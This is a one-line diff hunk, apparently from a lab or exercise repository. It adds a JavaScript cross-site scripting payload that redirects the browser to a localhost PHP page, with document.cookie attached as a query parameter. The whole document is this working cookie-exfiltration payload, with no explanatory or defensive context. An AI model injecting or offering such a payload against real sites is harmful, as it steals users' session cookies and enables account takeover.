@@ -1,0 +1,1 @@
+window.location = `localhost:80/index.php?intID=${document.cookie}`; 
